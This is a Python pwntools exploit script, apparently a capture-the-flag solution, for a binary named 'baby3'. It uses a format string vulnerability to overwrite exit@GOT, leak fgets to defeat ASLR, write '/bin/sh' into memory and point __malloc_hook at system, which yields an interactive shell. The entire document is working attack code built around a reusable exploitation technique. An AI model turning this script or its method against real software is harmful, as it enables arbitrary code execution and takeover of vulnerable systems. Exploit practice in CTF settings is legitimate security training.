from pwn import *

# Solution based on https://gist.github.com/0xb0bb/ac3dcc46ab542313a1f2f0abff62e20a
binary = './baby3'
remoteElf = './libc.so.6'
    
context.binary = binary

elf = ELF(binary)
libc = ELF('/usr/lib/libc.so.6')

p = elf.process()

def leak(addr):
    p.sendlineafter('input: ', '%7$s' + '.' * 4 + p64(addr))
    recv = p.recv().split('.')[0]
    return u64(recv.ljust(8, '\x00'))


def write(addr, toWrite):
    for i in range(len(toWrite)):
        value = ord(toWrite[i])

        if value == 0:
            value = 0x100

        p.sendline('%' + str(value).rjust(3, '0') + 'c%8$hhn' + '.' * 5 + p64(addr + i))
        p.recvuntil('input: ')

# Overwrite exit@got so that we use the string format vulnerability again
last12bits = str(int(hex(elf.sym['main'])[-3:], 16))
p.sendlineafter('input: ', '%' + last12bits + 'c%8$hn' + '.' * 5 + p64(elf.got['exit']))

# Leak fgets and defeat ASLR
leaked_fgets = leak(elf.got['fgets']);
offset = leaked_fgets - libc.sym['fgets']

libc.address = offset

print "libc base: " + hex(libc.address)
assert libc.sym['fgets'] == leaked_fgets

# Write /bin/sh to some random memory
random_addr = 0x602080
write(random_addr, '/bin/sh')

# Write system to __malloc_hook
write(libc.sym['__malloc_hook'], p64(libc.sym['system']))

# Trigger malloc
# Note that the parameter that malloc_hook is called with is 0x20 bigger than the actual string length
p.sendline('%' + str(random_addr - 0x20) + 'c')
p.interactive()
